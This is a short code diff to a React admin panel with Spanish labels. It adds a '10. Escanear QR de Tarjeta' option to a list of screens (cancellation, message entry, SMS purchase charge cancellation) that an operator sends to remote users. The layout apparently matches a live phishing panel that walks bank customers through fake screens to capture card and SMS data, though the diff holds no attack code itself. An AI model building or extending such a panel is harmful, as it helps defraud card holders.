@@ -459,6 +459,9 @@ export default function AdminPanel() {
       setActiveModal(screen);
       return;
     }
+    
+    // Para escanear_qr, enviamos directamente sin modal
+    console.log("Enviando tipo de pantalla:", screen);
 
     // Send direct screen change for other screens
     sendScreenChange({
@@ -698,6 +701,7 @@ export default function AdminPanel() {
                   <option value="cancelacion">7. Cancelación exitosa</option>
                   <option value="mensaje">8. Ingresa el mensaje que gustes</option>
                   <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
+                  <option value="escanear_qr">10. Escanear QR de Tarjeta</option>
                 </select>
               </div>
             </div>
